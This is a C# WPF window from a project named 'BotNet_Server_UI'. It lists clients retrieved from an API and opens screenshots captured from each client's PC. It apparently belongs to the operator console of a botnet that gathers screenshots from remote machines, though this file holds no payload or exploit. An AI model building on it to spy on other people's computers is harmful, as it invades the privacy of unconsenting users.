﻿// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Controls;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для Screens.xaml
    /// </summary>
    public partial class Screens : Window
    {
        public string nameofpc;

        public Screens()
        {
            InitializeComponent();
        }

        readonly List<Client> ip = new List<Client>();
        private async void ScrForm_Loaded(object sender, RoutedEventArgs e)
        {
            List<Button> buttons = new List<Button>();
        linkarrip:
            Client[] arr = await ApiRequest.GetProductAsync<Client[]>($"/api/client");
            if (arr == null)
            {
                goto linkarrip;
            }
            for (int j = 0; j < arr.Length; j++)
            {
                if (await ApiRequest.GetProductAsync<Screen>($"/api/screen/" + arr[j].id) == default(Screen))
                {
                    continue;
                }
                ip.Add(arr[j]);
            }
            for (int i = 0; i < ip.Count; i++)
            {
                string name = Convert.ToString(ip[i].id);
                buttons.Add(new Button()
                {
                    Name = "b" + name,
                    Content = $"Скриншоты ({ip[i].id}) " + ip[i].nameofpc
                });
                buttons[i].Click += Screens_Click;
                ListScrenns.Items.Add(buttons[i]);
            }
        }

        private async void Screens_Click(object sender, RoutedEventArgs e)
        {
            var element = e.OriginalSource as FrameworkElement;
            var name = element?.Name;
            var screen = await ApiRequest.GetProductAsync<Screen>($"/api/screen/" + name.Remove(0, 1));
            nameofpc = ip.Find(x=>x.id == Convert.ToInt32(name.Remove(0,1))).nameofpc;
            ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc)
            {
                Title = "Скриншоты " + nameofpc
            };
            screenBox.Show();
        }
    }
}